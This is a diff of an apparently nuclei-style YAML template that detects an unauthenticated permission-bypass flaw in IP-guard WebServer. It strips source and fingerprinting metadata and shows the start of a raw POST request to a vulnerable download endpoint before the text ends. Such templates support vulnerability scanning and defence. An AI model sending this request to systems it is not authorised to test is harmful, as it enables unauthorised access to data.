@@ -3,14 +3,8 @@ info:
   name: IP-guardWebServer权限绕过漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/32d17bbb705e5684188cfb0419f72719
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 32d17bbb705e5684188cfb0419f72719
-    fofa: + hunter`web.icon=="210a3c89d4ab5effa18d6dd7a9627376"`
 http:
 - raw:
   - 'POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1
